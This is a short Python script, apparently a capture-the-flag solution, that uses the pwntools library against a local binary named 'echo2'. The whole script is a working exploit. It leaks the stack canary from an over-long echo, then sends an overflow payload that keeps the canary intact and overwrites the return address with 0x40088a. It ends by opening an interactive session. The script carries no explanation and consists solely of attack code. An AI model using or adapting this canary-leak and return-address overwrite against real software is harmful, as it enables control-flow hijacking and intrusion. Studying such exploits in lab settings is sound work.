#! /usr/bin/env python

import pwn

conn = pwn.process('./echo2')

conn.recvuntil('Input size: ')
conn.sendline('200')
conn.recvuntil('Input data: ')
conn.sendline('x')

data = conn.recvuntil('Input size: ')

canary = data[0xa2:0xaa]
print('0x%08x' % pwn.u64(canary))

conn.sendline('200')

target = pwn.p64(0x40088a)
conn.recvuntil('Input data: ')
conn.sendline('x' * 152 + canary + 'abcdefgh' + target + target)

conn.recvuntil('Input size: ')
conn.sendline('4')
conn.recvuntil('Input data: ')
conn.sendline('exit')

conn.interactive()
